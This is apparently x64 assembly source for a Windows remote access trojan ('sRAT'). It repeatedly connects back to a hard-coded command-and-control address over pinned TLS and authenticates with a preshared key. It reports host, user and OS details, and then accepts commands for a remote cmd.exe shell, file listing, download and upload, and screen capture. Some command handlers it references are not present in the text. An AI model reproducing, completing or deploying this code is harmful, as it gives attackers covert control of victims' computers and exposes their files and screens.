default rel

%define AF_INET 2
%define SOCK_STREAM 1
%define IPPROTO_TCP 6

%define SECPKG_CRED_OUTBOUND 2
%define SECURITY_NATIVE_DREP 0x10
%define ISC_REQ_REPLAY_DETECT 0x4
%define ISC_REQ_SEQUENCE_DETECT 0x8
%define ISC_REQ_CONFIDENTIALITY 0x10
%define ISC_REQ_STREAM 0x8000
%define ISC_REQ_MANUAL_CRED_VALIDATION 0x80000
%define ISC_FLAGS (ISC_REQ_STREAM | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_MANUAL_CRED_VALIDATION)

%define SECBUFFER_EMPTY 0
%define SECBUFFER_DATA 1
%define SECBUFFER_TOKEN 2
%define SECBUFFER_EXTRA 5
%define SECBUFFER_STREAM_TRAILER 6
%define SECBUFFER_STREAM_HEADER 7

%define SEC_E_OK 0
%define SEC_I_CONTINUE_NEEDED 0x00090312
%define SEC_E_INCOMPLETE_MESSAGE 0x80090318
%define SEC_E_UNTRUSTED_ROOT 0x80090325
%define SEC_E_WRONG_PRINCIPAL 0x80090322
%define CERT_E_UNTRUSTEDROOT 0x800B0109
%define CERT_E_CN_NO_MATCH 0x800B010F

%define SECPKG_ATTR_STREAM_SIZES 4
%define SECPKG_ATTR_REMOTE_CERT_CONTEXT 0x53

%define SCHANNEL_CRED_VERSION 4
%define SCH_CRED_NO_DEFAULT_CREDS 0x10
%define SCH_CRED_MANUAL_CRED_VALIDATION 0x8
%define SP_PROT_TLS1_2_CLIENT 0x800

%define CALG_SHA_256 0x800C

%define C_HELLO 1
%define C_SYSINFO 2
%define C_SHELL_START 3
%define C_SHELL_CLOSE 4
%define C_SHELL_DATA 5
%define C_FS_LIST 6
%define C_FS_LIST_RESP 7
%define C_FS_GET 8
%define C_FS_PUT 9
%define C_FS_FILE 10
%define C_SCREEN 11
%define C_SCREEN_IMG 12
%define C_BYE 13
%define C_AUTH 14

%define MAX_FRAME 65536

%define HKEY_LOCAL_MACHINE 0x80000002
%define RRF_RT_ANY 0xFFFF
%define GENERIC_READ 0x80000000
%define GENERIC_WRITE 0x40000000
%define FILE_SHARE_READ 1
%define FILE_SHARE_WRITE 2
%define OPEN_EXISTING 3
%define CREATE_ALWAYS 2
%define FILE_ATTRIBUTE_NORMAL 0x80
%define FILE_ATTRIBUTE_DIRECTORY 0x10
%define MEM_COMMIT_RESERVE 0x3000
%define MEM_RELEASE 0x8000
%define PAGE_READWRITE 4
%define CREATE_NO_WINDOW 0x08000000
%define STARTF_USESTDHANDLES 0x100
%define STARTF_USESHOWWINDOW 1
%define SM_XVIRTUALSCREEN 76
%define SM_YVIRTUALSCREEN 77
%define SM_CXVIRTUALSCREEN 78
%define SM_CYVIRTUALSCREEN 79
%define SRCCOPY_CAPTURE 0x40CC0020

; stage codes for the debug harness
%define E_WSA 0xE001
%define E_CONNECT 0xE002
%define E_CREDS 0xE003
%define E_SEND 0xE005
%define E_PIN 0xE006
%define E_SIZES 0xE007
%define E_AUTH 0xE008
%define E_HELLO 0xE009
%define E_RECV 0xE00A

section .data
provider: db "Microsoft Unified Security Protocol Provider", 0
kpsk:     db "sRAT-change-me-psk"
pin:      db 0x08,0x22,0x8D,0xA7,0x86,0x98,0x4D,0x60,0x9B,0x76,0xEA,0xF9,0xF8,0x5B,0xD7,0x97
          db 0x0F,0xC3,0x8A,0x4F,0xB5,0x2C,0x7A,0x4B,0xB1,0xF4,0x69,0x1B,0x65,0xB3,0x1F,0x04
osname:   db "Windows"
s11:      db "11", 0
s10:      db "10", 0
s81:      db "8.1", 0
s8:       db "8", 0
s7:       db "7", 0
ntdllname: db "ntdll.dll", 0
rtlname:  db "RtlGetVersion", 0
cpukey:   db "HARDWARE\DESCRIPTION\System\CentralProcessor\0", 0
cpuval:   db "ProcessorNameString", 0
defpath:  db "C:\", 0
cmdline:  db "cmd.exe /Q /K chcp 65001 > nul", 0
fmt_host: db "host: %s", 10, "user: %s", 10, "os: %s (build %lu)", 10, 0
fmt_up:   db "uptime: %lu d %lu h %lu m", 10, 0
fmt_cpu:  db "cpu: %s (%lu logical)", 10, 0
fmt_ram:  db "ram: %lu MB total, %lu MB free (%lu%% used)", 10, 0
fmt_cwd:  db "cwd: %s", 10, "pid: %lu", 10, 0
errlist:  db "ERR|path not found", 10
errread:  db "Ecannot read file", 10
errtall:  db "Efile too large", 10
sa_in:
    dw AF_INET
    dw 0xFB20                 ; 8443 in network byte order
    dd 0x0100007F             ; 127.0.0.1
    dq 0

section .bss
alignb 16
wsadata:  resb 512
hcred:    resb 16
hctx:     resb 16
ts:       resb 8
cred:     resb 80
sizes:    resb 24
attr:     resb 4
status:   resb 4
first:    resb 4
need_recv: resb 4
havecred: resb 4
havectx:  resb 4
tmp32:    resb 4
g_sock:   resq 1
raw:      resb 32768
rawlen:   resq 1
decbuf:   resb 131072
declen:   resq 1
decpos:   resq 1
tmpbuf:   resb 16384
outtok:   resb 16384
outmsg:   resb 20480
txbuf:    resb 4096
sb0:      resb 16
sb1:      resb 16
sb2:      resb 16
sb3:      resb 16
indesc:   resb 16
inbuf:    resb 16
inbuf2:   resb 16
outdesc:  resb 16
outbuf:   resb 16
sdesc:    resb 16
db0:      resb 16
db1:      resb 16
db2:      resb 16
db3:      resb 16
ddesc:    resb 16
frame_hdr: resb 8
payload:  resb MAX_FRAME+1
g_cmd:    resb 4
g_len:    resb 4
hostbuf:  resb 256
userbuf:  resb 256
hostlen:  resb 4
userlen:  resb 4
hellobuf: resb 1024
proof:    resb 64
hashlen:  resb 4
authbuf:  resb 64
pcert:    resq 1
pm_extra: resq 1
g_sendptr: resq 1
g_sendlen: resb 4
g_dst:    resq 1
g_rem:    resb 4
g_lock:   resd 1
g_run:    resd 1
g_find:   resq 1
g_shellIn: resq 1
g_shellProc: resq 1
g_shellThread: resq 1
g_inR:    resq 1
g_inW:    resq 1
g_outR:   resq 1
g_outW:   resq 1
g_tid:    resd 1
g_hdc:    resq 1
g_memdc:  resq 1
g_bmp:    resq 1
g_old:    resq 1
g_vsy:    resd 1
g_px:     resq 1
fsize:    resq 1
bread:    resq 1
shread:   resd 1
sa:       resb 24
sui:      resb 104
pi:       resb 24
finddat:  resb 320
globbuf:  resb 1024
pathbuf:  resb 1024
numbuf:   resb 24
cpusz:    resd 1
cpusb:    resb 256
cwdbuf:   resb 260
osbuf:    resb 64
osbuild:  resd 1
rtlfn:    resq 1
vi:       resb 276
ms:       resb 64
shbuf:    resb 4096
resp:     resb 1000000

section .text
global start

extern __imp_WSAStartup
extern __imp_socket
extern __imp_connect
extern __imp_send
extern __imp_recv
extern __imp_closesocket
extern __imp_ExitProcess
extern __imp_Sleep
extern __imp_GetComputerNameA
extern __imp_GetUserNameA
extern __imp_AcquireCredentialsHandleA
extern __imp_InitializeSecurityContextA
extern __imp_QueryContextAttributesA
extern __imp_EncryptMessage
extern __imp_DecryptMessage
extern __imp_DeleteSecurityContext
extern __imp_FreeCredentialsHandle
extern __imp_CryptHashCertificate
extern __imp_CertFreeCertificateContext
extern __imp_CreateFileA
extern __imp_WriteFile
extern __imp_ReadFile
extern __imp_CloseHandle
extern __imp_lstrlenA
extern __imp_CreatePipe
extern __imp_SetHandleInformation
extern __imp_CreateProcessA
extern __imp_CreateThread
extern __imp_WaitForSingleObject
extern __imp_TerminateProcess
extern __imp_GetFileSizeEx
extern __imp_FindFirstFileA
extern __imp_FindNextFileA
extern __imp_FindClose
extern __imp_GetTickCount64
extern __imp_GetActiveProcessorCount
extern __imp_GlobalMemoryStatusEx
extern __imp_GetCurrentDirectoryA
extern __imp_GetCurrentProcessId
extern __imp_LoadLibraryA
extern __imp_GetProcAddress
extern __imp_VirtualAlloc
extern __imp_VirtualFree
extern __imp_RegGetValueA
extern __imp_wsprintfA
extern __imp_GetDC
extern __imp_ReleaseDC
extern __imp_GetSystemMetrics
extern __imp_CreateCompatibleDC
extern __imp_CreateCompatibleBitmap
extern __imp_SelectObject
extern __imp_BitBlt
extern __imp_GetDIBits
extern __imp_DeleteObject
extern __imp_DeleteDC

; ---------------------------------------------------------------- start
start:
    and rsp, -16
    sub rsp, 0x20
    call wsa_init
    test eax, eax
    jz .ok
    mov ecx, E_WSA
    call [rel __imp_ExitProcess]
.ok:
.retry:
    call session
    mov ecx, 3000
    call [rel __imp_Sleep]
    jmp .retry

; ---------------------------------------------------------------- wsa_init
wsa_init:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
    mov ecx, 0x0202
    lea rdx, [rel wsadata]
    call [rel __imp_WSAStartup]
    leave
    ret

; ---------------------------------------------------------------- tcp_connect
tcp_connect:
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    mov ecx, AF_INET
    mov edx, SOCK_STREAM
    mov r8d, IPPROTO_TCP
    call [rel __imp_socket]
    cmp rax, -1
    je .fail
    mov [rel g_sock], rax
    mov rcx, rax
    lea rdx, [rel sa_in]
    mov r8d, 16
    call [rel __imp_connect]
    test eax, eax
    jnz .closefail
    xor eax, eax
    leave
    ret
.closefail:
    mov rcx, [rel g_sock]
    call [rel __imp_closesocket]
    mov qword [rel g_sock], -1
.fail:
    mov eax, 1
    leave
    ret

; ---------------------------------------------------------------- raw_recv
; append up to 16k into raw[], return 1 ok / 0 fail
raw_recv:
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    mov rcx, [rel g_sock]
    lea rdx, [rel tmpbuf]
    mov r8d, 16384
    xor r9d, r9d
    call [rel __imp_recv]
    test eax, eax
    jle .fail
    movsxd rax, eax
    mov rcx, [rel rawlen]
    mov rdx, rcx
    add rdx, rax
    cmp rdx, 32700
    ja .fail
    lea rdi, [rel raw]
    add rdi, rcx
    lea rsi, [rel tmpbuf]
    mov rcx, rax
    rep movsb
    add [rel rawlen], rax
    mov eax, 1
    leave
    ret
.fail:
    xor eax, eax
    leave
    ret

; ---------------------------------------------------------------- send_all
; rcx = ptr, edx = len -> 1 ok / 0 fail
send_all:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x30
    mov rbx, rcx
    mov r12d, edx
.loop:
    test r12d, r12d
    jz .ok
    mov rcx, [rel g_sock]
    mov rdx, rbx
    mov r8d, r12d
    xor r9d, r9d
    call [rel __imp_send]
    test eax, eax
    jle .fail
    movsxd rax, eax
    add rbx, rax
    sub r12d, eax
    jmp .loop
.ok:
    mov eax, 1
    jmp .out
.fail:
    xor eax, eax
.out:
    add rsp, 0x30
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- tls_send
; rcx = ptr, edx = len (chunks to cbMaximumMessage)
tls_send:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x30
    mov rbx, rcx
    mov r12d, edx
.loop:
    test r12d, r12d
    jz .ok
    mov eax, [rel sizes+8]        ; cbMaximumMessage
    test eax, eax
    jnz .have
    mov eax, 16384
.have:
    cmp eax, r12d
    jbe .chunk
    mov eax, r12d
.chunk:
    mov [rel g_sendlen], eax
    ; payload -> outmsg + cbHeader
    mov ecx, [rel sizes]
    lea rdi, [rel outmsg]
    add rdi, rcx
    mov rsi, rbx
    mov ecx, eax
    rep movsb
    ; sb0 header
    lea rax, [rel outmsg]
    mov [rel sb0+8], rax
    mov eax, [rel sizes]
    mov [rel sb0], eax
    mov dword [rel sb0+4], SECBUFFER_STREAM_HEADER
    ; sb1 data
    mov eax, [rel sizes]
    lea rdx, [rel outmsg]
    add rdx, rax
    mov [rel sb1+8], rdx
    mov eax, [rel g_sendlen]
    mov [rel sb1], eax
    mov dword [rel sb1+4], SECBUFFER_DATA
    ; sb2 trailer
    mov eax, [rel sizes]
    lea rdx, [rel outmsg]
    add rdx, rax
    mov eax, [rel g_sendlen]
    add rdx, rax
    mov [rel sb2+8], rdx
    mov eax, [rel sizes+4]
    mov [rel sb2], eax
    mov dword [rel sb2+4], SECBUFFER_STREAM_TRAILER
    ; sb3 empty
    mov qword [rel sb3], 0
    mov qword [rel sb3+8], 0
    ; desc
    lea rax, [rel sdesc]
    mov dword [rax], 0
    mov dword [rax+4], 4
    lea rdx, [rel sb0]
    mov [rax+8], rdx
    ; EncryptMessage
    lea rcx, [rel hctx]
    xor edx, edx
    lea r8, [rel sdesc]
    xor r9d, r9d
    call [rel __imp_EncryptMessage]
    test eax, eax
    jnz .fail
    mov r8d, [rel sb0]
    add r8d, [rel sb1]
    add r8d, [rel sb2]
    lea rcx, [rel outmsg]
    mov edx, r8d
    call send_all
    test eax, eax
    jz .fail
    mov eax, [rel g_sendlen]
    add rbx, rax
    sub r12d, eax
    jmp .loop
.ok:
    mov eax, 1
    jmp .out
.fail:
    xor eax, eax
.out:
    add rsp, 0x30
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- tls_pump
; decrypt whatever is in raw[] into decbuf[]
tls_pump:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x30
.again:
    cmp qword [rel rawlen], 0
    jne .decrypt
    call raw_recv
    test eax, eax
    jz .fail
.decrypt:
    ; db0 = data(raw, rawlen)
    mov rax, [rel rawlen]
    mov [rel db0], eax
    mov dword [rel db0+4], SECBUFFER_DATA
    lea rax, [rel raw]
    mov [rel db0+8], rax
    ; db1..db3 empty
    lea rax, [rel db1]
    mov qword [rax], 0
    mov qword [rax+8], 0
    lea rax, [rel db2]
    mov qword [rax], 0
    mov qword [rax+8], 0
    lea rax, [rel db3]
    mov qword [rax], 0
    mov qword [rax+8], 0
    ; desc
    lea rax, [rel ddesc]
    mov dword [rax], 0
    mov dword [rax+4], 4
    lea rdx, [rel db0]
    mov [rax+8], rdx
    lea rcx, [rel hctx]
    lea rdx, [rel ddesc]
    xor r8d, r8d
    xor r9d, r9d
    call [rel __imp_DecryptMessage]
    cmp eax, SEC_E_INCOMPLETE_MESSAGE
    je .need_more
    test eax, eax
    jnz .fail
    ; compact decbuf: keep [decpos, declen)
    mov rax, [rel declen]
    sub rax, [rel decpos]
    test rax, rax
    jz .compacted
    lea rsi, [rel decbuf]
    add rsi, [rel decpos]
    lea rdi, [rel decbuf]
    mov rcx, rax
    rep movsb
.compacted:
    mov [rel declen], rax
    mov qword [rel decpos], 0
    ; walk the four buffers
    mov qword [rel pm_extra], 0
    lea rbx, [rel db0]
    mov r12d, 4
.buf:
    mov eax, [rbx+4]
    cmp eax, SECBUFFER_DATA
    jne .maybe_extra
    mov edx, [rbx]
    test edx, edx
    jz .next
    mov rax, [rel declen]
    lea rdi, [rel decbuf]
    add rdi, rax
    mov rsi, [rbx+8]
    mov ecx, edx
    rep movsb
    mov rax, [rel declen]
    mov edx, [rbx]
    add rax, rdx
    mov [rel declen], rax
    jmp .next
.maybe_extra:
    cmp eax, SECBUFFER_EXTRA
    jne .next
    mov eax, [rbx]
    add [rel pm_extra], rax
.next:
    add rbx, 16
    dec r12d
    jnz .buf
    ; keep only the leftover bytes
    mov rax, [rel rawlen]
    sub rax, [rel pm_extra]
    lea rsi, [rel raw]
    add rsi, rax
    lea rdi, [rel raw]
    mov rcx, [rel pm_extra]
    rep movsb
    mov rax, [rel pm_extra]
    mov [rel rawlen], rax
    test rax, rax
    jnz .again
    mov eax, 1
    jmp .out
.need_more:
    call raw_recv
    test eax, eax
    jz .fail
    jmp .again
.fail:
    xor eax, eax
.out:
    add rsp, 0x30
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- tls_recv_exact
; rcx = dst, edx = count
tls_recv_exact:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x30
    mov rbx, rcx
    mov r12d, edx
.loop:
    test r12d, r12d
    jz .ok
    mov rax, [rel declen]
    sub rax, [rel decpos]
    test rax, rax
    jnz .copy
    call tls_pump
    test eax, eax
    jz .fail
    jmp .loop
.copy:
    cmp rax, r12
    jbe .take
    mov rax, r12
.take:
    lea rsi, [rel decbuf]
    add rsi, [rel decpos]
    mov rdi, rbx
    mov rcx, rax
    rep movsb
    add [rel decpos], rax
    add rbx, rax
    sub r12d, eax
    jmp .loop
.ok:
    mov eax, 1
    jmp .out
.fail:
    xor eax, eax
.out:
    add rsp, 0x30
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- frame_recv
frame_recv:
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    lea rcx, [rel frame_hdr]
    mov edx, 8
    call tls_recv_exact
    test eax, eax
    jz .fail
    mov eax, [rel frame_hdr]
    mov [rel g_len], eax
    mov edx, [rel frame_hdr+4]
    mov [rel g_cmd], edx
    cmp eax, MAX_FRAME
    ja .fail
    test eax, eax
    jz .ok
    lea rcx, [rel payload]
    mov edx, eax
    call tls_recv_exact
    test eax, eax
    jz .fail
    mov ecx, [rel g_len]
    lea rdx, [rel payload]
    mov byte [rdx+rcx], 0
.ok:
    mov eax, 1
    jmp .out
.fail:
    xor eax, eax
.out:
    leave
    ret

; ---------------------------------------------------------------- frame_send
; ecx = cmd, rdx = payload, r8d = len
frame_send:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    sub rsp, 0x38
    mov r12d, ecx
    mov rbx, rdx
    mov r13d, r8d
    call lock_msg
    mov [rel frame_hdr], r13d
    mov [rel frame_hdr+4], r12d
    lea rcx, [rel frame_hdr]
    mov edx, 8
    call tls_send
    test eax, eax
    jz .fail
    test r13d, r13d
    jz .ok
    mov rcx, rbx
    mov edx, r13d
    call tls_send
    test eax, eax
    jz .fail
.ok:
    call unlock_msg
    mov eax, 1
    jmp .out
.fail:
    call unlock_msg
    xor eax, eax
.out:
    add rsp, 0x38
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- lock_msg
lock_msg:
    lock bts dword [rel g_lock], 0
    jnc .got
.spin:
    pause
    lock bts dword [rel g_lock], 0
    jc .spin
.got:
    ret

unlock_msg:
    mov dword [rel g_lock], 0
    ret

; ---------------------------------------------------------------- u64_dec
; rdi = dest, rdx = value -> rdi advanced
u64_dec:
    push rbx
    mov rax, rdx
    lea rbx, [rel numbuf+24]
    mov r8, 10
.loop:
    xor edx, edx
    div r8
    add dl, '0'
    dec rbx
    mov [rbx], dl
    test rax, rax
    jnz .loop
    mov rsi, rbx
    lea rcx, [rel numbuf+24]
    sub rcx, rbx
    rep movsb
    pop rbx
    ret

; ---------------------------------------------------------------- tls_handshake
tls_handshake:
    push rbp
    mov rbp, rsp
    sub rsp, 0x90
    ; zero SCHANNEL_CRED
    lea rdi, [rel cred]
    xor eax, eax
    mov ecx, 10
    rep stosq
    mov dword [rel cred], SCHANNEL_CRED_VERSION
    mov dword [rel cred+56], SP_PROT_TLS1_2_CLIENT
    mov dword [rel cred+72], (SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION)
    ; AcquireCredentialsHandleA
    xor ecx, ecx
    lea rdx, [rel provider]
    mov r8d, SECPKG_CRED_OUTBOUND
    xor r9d, r9d
    lea rax, [rel cred]
    mov [rsp+32], rax
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    lea rax, [rel hcred]
    mov [rsp+56], rax
    lea rax, [rel ts]
    mov [rsp+64], rax
    call [rel __imp_AcquireCredentialsHandleA]
    test eax, eax
    jnz .e_creds
    mov dword [rel havecred], 1
    mov dword [rel first], 1
    mov dword [rel need_recv], 0
    mov qword [rel rawlen], 0
    mov qword [rel declen], 0
    mov qword [rel decpos], 0
.loop:
    cmp dword [rel need_recv], 0
    je .call
    call raw_recv
    test eax, eax
    jz .e_recv
    mov dword [rel need_recv], 0
.call:
    ; input buffer
    lea rax, [rel inbuf]
    mov dword [rax+4], SECBUFFER_TOKEN
    lea rdx, [rel raw]
    mov [rax+8], rdx
    mov rcx, [rel rawlen]
    mov [rax], ecx
    lea rax, [rel inbuf2]
    mov qword [rax], 0
    mov qword [rax+8], 0
    ; input desc
    lea rax, [rel indesc]
    mov dword [rax], 0
    mov dword [rax+4], 2
    lea rdx, [rel inbuf]
    mov [rax+8], rdx
    ; output buffer (reset each time)
    lea rax, [rel outbuf]
    mov dword [rax], 16384
    mov dword [rax+4], SECBUFFER_TOKEN
    lea rdx, [rel outtok]
    mov [rax+8], rdx
    lea rax, [rel outdesc]
    mov dword [rax], 0
    mov dword [rax+4], 1
    lea rdx, [rel outbuf]
    mov [rax+8], rdx
    ; InitializeSecurityContextA
    lea rcx, [rel hcred]
    cmp dword [rel first], 0
    je .with_ctx
    xor edx, edx
    jmp .ctx_set
.with_ctx:
    lea rdx, [rel hctx]
.ctx_set:
    xor r8d, r8d
    mov r9d, ISC_FLAGS
    mov qword [rsp+32], 0
    mov qword [rsp+40], SECURITY_NATIVE_DREP
    cmp dword [rel first], 0
    jne .no_input
    lea rax, [rel indesc]
    jmp .input_set
.no_input:
    xor eax, eax
.input_set:
    mov [rsp+48], rax
    mov qword [rsp+56], 0
    lea rax, [rel hctx]
    mov [rsp+64], rax
    lea rax, [rel outdesc]
    mov [rsp+72], rax
    lea rax, [rel attr]
    mov [rsp+80], rax
    lea rax, [rel ts]
    mov [rsp+88], rax
    call [rel __imp_InitializeSecurityContextA]
    mov [rel status], eax
    mov dword [rel havectx], 1
    ; send the token if there is one
    mov eax, [rel status]
    cmp eax, SEC_E_INCOMPLETE_MESSAGE
    je .after_send
    mov ecx, [rel outbuf]
    test ecx, ecx
    jz .after_send
    lea rcx, [rel outtok]
    mov edx, [rel outbuf]
    call send_all
    test eax, eax
    jz .e_send
.after_send:
    mov dword [rel first], 0
    ; keep only leftover bytes after the consumed token
    mov qword [rel pm_extra], 0
    cmp dword [rel inbuf2+4], SECBUFFER_EXTRA
    jne .no_extra
    mov eax, [rel inbuf2]
    mov [rel pm_extra], rax
.no_extra:
    mov rax, [rel rawlen]
    sub rax, [rel pm_extra]
    lea rsi, [rel raw]
    add rsi, rax
    lea rdi, [rel raw]
    mov rcx, [rel pm_extra]
    rep movsb
    mov rax, [rel pm_extra]
    mov [rel rawlen], rax
    ; status
    mov eax, [rel status]
    cmp eax, SEC_I_CONTINUE_NEEDED
    je .continue
    cmp eax, SEC_E_INCOMPLETE_MESSAGE
    je .incomplete
    cmp eax, SEC_E_OK
    je .done
    cmp eax, SEC_E_UNTRUSTED_ROOT
    je .done
    cmp eax, SEC_E_WRONG_PRINCIPAL
    je .done
    cmp eax, CERT_E_UNTRUSTEDROOT
    je .done
    cmp eax, CERT_E_CN_NO_MATCH
    je .done
    ; fatal SChannel error
    xor eax, eax
    jmp .out
.continue:
    cmp qword [rel rawlen], 0
    jne .loop
    mov dword [rel need_recv], 1
    jmp .loop
.incomplete:
    mov dword [rel need_recv], 1
    jmp .loop
.done:
    lea rcx, [rel hctx]
    mov edx, SECPKG_ATTR_STREAM_SIZES
    lea r8, [rel sizes]
    call [rel __imp_QueryContextAttributesA]
    test eax, eax
    jnz .e_sizes
    mov eax, 1
    jmp .out
.e_creds:
.e_send:
.e_recv:
.e_sizes:
    xor eax, eax
.out:
    leave
    ret

; ---------------------------------------------------------------- tls_pin
tls_pin:
    push rbp
    mov rbp, rsp
    sub rsp, 0x60
    lea r8, [rel pcert]
    lea rcx, [rel hctx]
    mov edx, SECPKG_ATTR_REMOTE_CERT_CONTEXT
    call [rel __imp_QueryContextAttributesA]
    test eax, eax
    jnz .fail
    mov rax, [rel pcert]
    mov r9, [rax+8]
    mov r10d, [rax+16]
    xor ecx, ecx
    mov edx, CALG_SHA_256
    xor r8d, r8d
    mov qword [rsp+32], r10
    lea rax, [rel proof]
    mov [rsp+40], rax
    lea rax, [rel hashlen]
    mov [rsp+48], rax
    mov dword [rel hashlen], 32
    call [rel __imp_CryptHashCertificate]
    mov [rel tmp32], eax
    mov rcx, [rel pcert]
    call [rel __imp_CertFreeCertificateContext]
    cmp dword [rel tmp32], 0
    je .fail
    cmp dword [rel hashlen], 32
    jne .fail
    lea rsi, [rel proof]
    lea rdi, [rel pin]
    mov ecx, 32
    repe cmpsb
    jne .fail
    mov eax, 1
    leave
    ret
.fail:
    xor eax, eax
    leave
    ret

; ---------------------------------------------------------------- tls_free
tls_free:
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    cmp dword [rel havectx], 0
    je .noc
    lea rcx, [rel hctx]
    call [rel __imp_DeleteSecurityContext]
    mov dword [rel havectx], 0
.noc:
    cmp dword [rel havecred], 0
    je .out
    lea rcx, [rel hcred]
    call [rel __imp_FreeCredentialsHandle]
    mov dword [rel havecred], 0
.out:
    leave
    ret

; ---------------------------------------------------------------- auth
auth:
    push rbp
    mov rbp, rsp
    sub rsp, 0x50
    call frame_recv
    test eax, eax
    jz .fail
    cmp dword [rel g_cmd], C_AUTH
    jne .fail
    cmp dword [rel g_len], 16
    jne .fail
    ; kPsk || nonce
    lea rdi, [rel authbuf]
    lea rsi, [rel kpsk]
    mov ecx, 18
    rep movsb
    lea rsi, [rel payload]
    mov ecx, 16
    rep movsb
    ; SHA-256
    xor ecx, ecx
    mov edx, CALG_SHA_256
    xor r8d, r8d
    lea r9, [rel authbuf]
    mov qword [rsp+32], 34
    lea rax, [rel proof]
    mov [rsp+40], rax
    lea rax, [rel hashlen]
    mov [rsp+48], rax
    mov dword [rel hashlen], 32
    call [rel __imp_CryptHashCertificate]
    test eax, eax
    jz .fail
    cmp dword [rel hashlen], 32
    jne .fail
    mov ecx, C_AUTH
    lea rdx, [rel proof]
    mov r8d, 32
    call frame_send
    test eax, eax
    jz .fail
    mov eax, 1
    leave
    ret
.fail:
    xor eax, eax
    leave
    ret

; ---------------------------------------------------------------- hello
hello:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x30
    mov dword [rel hostlen], 256
    lea rcx, [rel hostbuf]
    lea rdx, [rel hostlen]
    call [rel __imp_GetComputerNameA]
    test eax, eax
    jnz .host_ok
    mov dword [rel hostlen], 0
    mov byte [rel hostbuf], 0
.host_ok:
    mov dword [rel userlen], 256
    lea rcx, [rel userbuf]
    lea rdx, [rel userlen]
    call [rel __imp_GetUserNameA]
    test eax, eax
    jnz .user_ok
    mov dword [rel userlen], 0
    mov byte [rel userbuf], 0
.user_ok:
    lea rbx, [rel hellobuf]
    mov rdi, rbx
    lea rsi, [rel hostbuf]
    mov ecx, [rel hostlen]
    rep movsb
    mov byte [rdi], '|'
    inc rdi
    lea rsi, [rel userbuf]
    mov ecx, [rel userlen]
    rep movsb
    mov byte [rdi], '|'
    inc rdi
    mov r12, rdi
    call os_name
    mov rdi, r12
    mov rsi, rax
    mov ecx, edx
    rep movsb
    mov byte [rdi], '|'
    inc rdi
    mov byte [rdi], '?'
    inc rdi
    mov r8, rdi
    sub r8, rbx
    mov ecx, C_HELLO
    mov rdx, rbx
    call frame_send
    test eax, eax
    jz .fail
    mov eax, 1
    jmp .out
.fail:
    xor eax, eax
.out:
    add rsp, 0x30
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- os_name
; -> rax = osbuf, edx = len, osbuild set
os_name:
    push rbp
    mov rbp, rsp
    push rbx
    sub rsp, 0x38
    mov rax, [rel rtlfn]
    test rax, rax
    jnz .have_fn
    lea rcx, [rel ntdllname]
    call [rel __imp_LoadLibraryA]
    test rax, rax
    jz .fallback
    mov rcx, rax
    lea rdx, [rel rtlname]
    call [rel __imp_GetProcAddress]
    mov [rel rtlfn], rax
    test rax, rax
    jz .fallback
.have_fn:
    lea rcx, [rel vi]
    mov dword [rcx], 276
    call rax
    mov eax, [rel vi+12]
    mov [rel osbuild], eax
    cmp eax, 22000
    jae .v11
    cmp eax, 10240
    jae .v10
    cmp eax, 9600
    jae .v81
    cmp eax, 9200
    jae .v8
    cmp eax, 7600
    jae .v7
    xor eax, eax
    jmp .build
.v11:
    lea rax, [rel s11]
    jmp .build
.v10:
    lea rax, [rel s10]
    jmp .build
.v81:
    lea rax, [rel s81]
    jmp .build
.v8:
    lea rax, [rel s8]
    jmp .build
.v7:
    lea rax, [rel s7]
    jmp .build
.fallback:
    mov dword [rel osbuild], 0
    xor eax, eax
.build:
    mov rbx, rax
    lea rdi, [rel osbuf]
    lea rcx, [rel osname]
    call [rel __imp_lstrlenA]
    mov ecx, eax
    lea rsi, [rel osname]
    rep movsb
    test rbx, rbx
    jz .fin
    mov byte [rdi], ' '
    inc rdi
    mov rcx, rbx
    call [rel __imp_lstrlenA]
    mov ecx, eax
    mov rsi, rbx
    rep movsb
.fin:
    mov byte [rdi], 0
    lea rdx, [rel osbuf]
    sub rdi, rdx
    mov edx, edi
    lea rax, [rel osbuf]
    add rsp, 0x38
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- session_loop
session_loop:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
.loop:
    call frame_recv
    test eax, eax
    jz .end
    mov eax, [rel g_cmd]
    cmp eax, C_SHELL_START
    je .shell_start
    cmp eax, C_SHELL_CLOSE
    je .shell_stop
    cmp eax, C_SHELL_DATA
    je .shell_data
    cmp eax, C_FS_LIST
    je .fs_list
    cmp eax, C_FS_GET
    je .fs_get
    cmp eax, C_FS_PUT
    je .fs_put
    cmp eax, C_SYSINFO
    je .sysinfo
    cmp eax, C_SCREEN
    je .screen
    cmp eax, C_BYE
    je .end
    jmp .loop
.shell_start:
    call shell_start
    jmp .loop
.shell_stop:
    call shell_stop
    jmp .loop
.shell_data:
    mov rcx, [rel g_shellIn]
    test rcx, rcx
    jz .loop
    lea rdx, [rel payload]
    mov r8d, [rel g_len]
    lea r9, [rel bread]
    mov qword [rsp+32], 0
    call [rel __imp_WriteFile]
    jmp .loop
.fs_list:
    lea rcx, [rel payload]
    mov edx, [rel g_len]
    call fs_list
    jmp .loop
.fs_get:
    call fs_get
    jmp .loop
.fs_put:
    call fs_put
    jmp .loop
.sysinfo:
    call sysinfo
    jmp .loop
.screen:
    call screen
    jmp .loop
.end:
    leave
    ret

